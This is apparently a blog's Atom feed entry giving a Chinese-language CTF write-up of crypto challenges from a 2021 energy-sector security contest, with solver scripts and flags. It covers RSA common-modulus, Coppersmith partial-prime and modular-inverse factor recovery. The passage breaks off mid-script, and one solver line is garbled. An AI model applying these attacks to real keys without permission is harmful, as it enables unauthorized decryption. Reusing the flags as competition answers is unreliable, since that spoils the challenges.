<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazzaro</title>
  
  
  <link href="https://lazzzaro.github.io/atom.xml" rel="self"/>
  
  <link href="https://lazzzaro.github.io/"/>
  <updated>2021-10-16T16:00:36.995Z</updated>
  <id>https://lazzzaro.github.io/</id>
  
  <author>
    <name>Lazzaro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021年中国能源网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-10-15T11:39:32.000Z</published>
    <updated>2021-10-16T16:00:36.995Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安全防护的重要指示精神，落实《关键信息基础设施安全保护条例》的有关要求，全面提升我国能源行业网络安全水平，加强能源网络安全人才培养与技术交流，加快构建“清洁低碳、安全高效”的能源体系，中国能源研究会定于2021年9～11月举办2021年中国能源网络安全大赛暨中国能源网络与数据安全大会。</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e1=835967807536519622934604405063</span><br><span class="line">c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span><br><span class="line">n1=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br><span class="line">e2=885003184250422219085124964981</span><br><span class="line">c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span><br><span class="line">n2=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br></pre></td></tr></table></figure></blockquote><p>$n_1=n_2$，RSA共模攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span></span><br><span class="line">e1 = <span class="number">835967807536519622934604405063</span></span><br><span class="line">c1 = <span class="number">19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span></span><br><span class="line">e2 = <span class="number">885003184250422219085124964981</span></span><br><span class="line">c2 = <span class="number">4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#666c61677b36323462306666352d326436642d313165632d623438622d6463613930343938613264627d</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;</code></p><p>​    </p><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><blockquote><p>31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d</p></blockquote><p>先转hex得到 <code>13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code>，</p><p><code>zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code> 根据无数字1和等号特征，猜测是转小写的base32；</p><p>转回大写，由前面提示 <code>13+5</code>，rot13+base32得到 <code>fladå.Ù..Å.Í.Õ.Á.ÌÅ....Èå.ÈäÝ...Õ..Éþ</code> 出现flag头；</p><p>由于 <code>base32(&#39;flag&#123;&#39;)=MZWGCZ33</code>，数字为rot5，密文还原为 <code>MZWGCZ33HFSTMZLGGFQTGZRVMYYGKMZRMNQWIZBSHFRTEOJXMJSWMNLBMQZH2===</code>，</p><p>base32 解码得 <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code>。</p><p><strong>FLAG:</strong> <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code></p><p>​    </p><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><blockquote><p>杂七杂八密码的混合体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line">status=<span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">b&quot;flag&#123;*************&#125;&quot;</span></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">binp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">c = (<span class="built_in">pow</span>(num, e, n))</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc2&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(n)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(binp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">chr</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>LFSR + RSA高位p泄露攻击。</p><p>先模拟LFSR求出760组 <code>out</code> 01值，结合<code>enc</code>文件中01密文，异或还原 $p$ 的高760二进制位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#xx27;</span>))</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line">pp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">pp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">pp = <span class="built_in">int</span>(pp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(pp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#6064523798049644277925701126806650606472211004362096137261922023539261533931159712229993784486900304494092698035668254711607734547323493716579247168129613825017402250081444943555723771998431425098683590600454956058175183022718975</span></span><br></pre></td></tr></table></figure><p>利用coppersmith攻击方法，进行已知 $p$ 高位攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">20929902170717676951934620006433003604730678640645007075637305655990838672444304031857412581445836654784941618387885677741424195646067710979291690749949226354601059943673546892769474380805413381477209725509187761202889007557157174009816759858206190915193870770303140668513899480840368042056977078850633645939996806974754076338446182094408033833859119883893893710390855924917625801146138452249766835457952331243832878453385608344187234621288871394907683956060567710199168220435234555727645472494418988488158424284566395402382371954247354264148359024995803494283148151292240772247688313806712633140618802681063347059301</span></span><br><span class="line">p4 = <span class="number">6020793003600505515657431119157212393365966944447518390323900168965824649782228689680274668164250924439790546808885513956693311045291390596152861670602514965058376230082977010070282487901715757886308848763512028412503942684262007</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>+<span class="built_in">str</span>(n//p))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line"><span class="comment">#q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br></pre></td></tr></table></figure><p>最后常规RSA解 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line">q = <span class="number">117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12381638589055841139447839302795029653843309313978198727914736718245700098003130043532117734105184556347388175236916768083364314767482249333410320774565764577094924964983543424785959666191716662886118558538365503080964047183533841342232120086245448689762948846598689811062301086591078119426971029385906936610191899748366808606594184238261341160458933596780268681004577561284530512291876043524269456261191856680575840859843145591670082313114482813697656520320677074240863479192424768989294287655231041605257414144367688426659163486702611196512549549115716697786311455783534600599360245502989232358699920442842821956230</span></span><br><span class="line">d = gmpy2.invert(e, fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;th1s_ls_4_eZ_quEST1on&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;th1s_ls_4_eZ_quEST1on&#125;</code></p><p>​    </p><h3 id="NumberGame"><a href="#NumberGame" class="headerlink" title="NumberGame"></a>NumberGame</h3><blockquote><p>数字的游戏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=65537</span><br><span class="line">(p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span><br><span class="line">c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span><br><span class="line">invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span><br><span class="line">invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span><br></pre></td></tr></table></figure></blockquote><p>给出 $(p-1)(q-1),x=\text{inv}(p,q),y=\text{inv}(q,p),e,c$。</p><p>详细推导思路可参考 <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>。</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span></span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span></span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    fn = <span class="number">15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = gmpy2.invert(e,fn)</span><br><span class="line">    pprime = <span class="number">63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span></span><br><span class="line">    qprime = <span class="number">61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span 